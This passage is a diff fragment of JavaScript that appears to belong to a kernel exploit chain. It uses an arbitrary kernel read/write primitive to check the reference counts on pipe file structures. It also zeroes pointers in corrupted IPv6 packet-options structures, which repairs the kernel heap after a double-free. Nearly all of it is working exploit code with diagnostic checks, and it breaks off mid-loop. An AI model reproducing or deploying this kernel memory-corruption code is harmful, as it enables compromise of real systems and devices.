+                                        holdLog.push(pipeFds[i] + ":" + h.before
+                                            + "->" + h.after);
+
+                                        if (h.after > h.before && h.after >= 2) held++;
+                                    }
+                                    mark("PIPE-REFCNT", holdLog.join("  "));
+                                    check("four-pipe-files-hold"
+                                        + "reference", held === 4,
+                                        held + "/4 -- without this, closing the master "
+                                        + "pipe kmem_frees slave's struct pipe, and "
+                                        + "closing the slave frees whatever address its "
+                                        + "pipebuf last pointed at");
+
+                                    const masterOne = holdLog.slice(0, 2).every(
+                                        function (s) { return /:1->/.test(s); });
+                                    check("f_count-read-1-master-fds"
+                                        + "what one fd and no other holder gives",
+                                        masterOne, masterOne
+                                            ? "so 0x28 is f_count. The slave pair reads "
+                                            + "high because kv's own read(slave[0]) and "
+                                            + "write(slave[1]) hold it while they work."
+                                            : holdLog.join(" ") + " -- if these are not "
+                                            + "small reference counts, 0x28 is the wrong "
+                                            + "field and the hold is corrupting "
+                                            + "something else");
+
+                                    kview(optsA).setBInt(PKTOPTS_PKTINFO, 0, true);
+
+                                    kview(optsA).setBInt(PKTOPTS_M, 0, true);
+                                    kview(optsB).setBInt(PKTOPTS_RTHDR, 0, true);
+                                    kview(optsC).setBInt(PKTOPTS_RTHDR, 0, true);
+
+                                    const backA = kview(optsA).getBInt(PKTOPTS_PKTINFO, true);
+                                    const backM = kview(optsA).getBInt(PKTOPTS_M, true);
+                                    const backB = kview(optsB).getBInt(PKTOPTS_RTHDR, true);
+                                    const backC = kview(optsC).getBInt(PKTOPTS_RTHDR, true);
+                                    const zeroed = function (v) {
+                                        return !!v && v.low === 0 && v.hi === 0;
+                                    };
+                                    mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
+                                        + " ip6po_m=" + backM
+                                        + " twin rthdr=" + backB
+                                        + " 0x80 rthdr=" + backC);
+                                    const cleared = zeroed(backA) && zeroed(backM)
+                                        && zeroed(backB) && zeroed(backC);
+                                    check("second-owner-reads-null"
+                                        + "pointer", cleared,
+                                        cleared ? "chunk X is freed once, by fd "
+                                            + pktoptsTwins[0] + "; chunk Y is freed by "
+                                            + "nobody and leaks 0x80 bytes"
+                                            : "at least one pointer did not clear");
+
+                                    chunkX.u8.fill(0);
+                                    kv.kread(chunkX.addr, reqs1Aligned, 0x100);
+                                    let leftover = 0;
+                                    for (let o = 0; o < 0x100; o += 8) {
+                                                
